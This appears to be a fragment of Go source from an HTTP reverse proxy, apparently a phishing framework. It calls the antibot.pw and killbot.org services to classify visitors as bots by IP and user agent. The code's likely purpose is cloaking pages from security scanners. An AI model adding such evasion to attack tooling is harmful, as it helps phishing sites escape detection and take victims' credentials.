func (p *HttpProxy) checkAntibotPw(ip, ua string) (bool, error) {
	apiURL := fmt.Sprintf("https://antibot.pw/api/v2-blockers?ip=%s&apikey=%s&ua=%s",
		url.QueryEscape(ip), url.QueryEscape(p.cfg.antibotpw_apikey), url.QueryEscape(ua))
	client := &http.Client{Timeout: 3 * time.Second}
	resp, err := client.Get(apiURL)
	if err != nil {
		log.Debug("[antibotpw] API error: %v", err)
		return false, err
	}
	defer resp.Body.Close()
	body, _ := ioutil.ReadAll(resp.Body)
	result := strings.TrimSpace(string(body))
	// antibot.pw returns "block" or similar indicator for bots
	if strings.Contains(strings.ToLower(result), "block") || strings.Contains(strings.ToLower(result), "bot") || strings.Contains(strings.ToLower(result), "true") {
		log.Info("[antibotpw] API flagged %s as bot: %s", ip, result)
		return true, nil
	}
	return false, nil
}

// checkKillbot queries the killbot.org API to check if an IP is a bot.
func (p *HttpProxy) checkKillbot(ip, ua string) (bool, error) {
	apiURL := fmt.Sprintf("https://killbot.org/api/v1/check?ip=%s&key=%s&ua=%s",
		url.QueryEscape(ip), url.QueryEscape(p.cfg.killbot_apikey), url.QueryEscape(ua))
	client := &http.Client{Timeout: 3 * time.Second}
	resp, err := client.Get(apiURL)
	if err != nil {
		log.Debug("[killbot] API error: %v", err)
		return false, err
	}
	defer resp.Body.Close()
	body, _ := ioutil.ReadAll(resp.Body)
	result := strings.TrimSpace(string(body))
	if strings.Contains(strings.ToLower(result), "block") || strings.Contains(strings.ToLower(result), "bot") || strings.Contains(strings.ToLower(result), "true") {
		log.Info("[killbot] API flagged %s as bot: %s", ip, result)
		return true, nil
	}
	return false, nil
}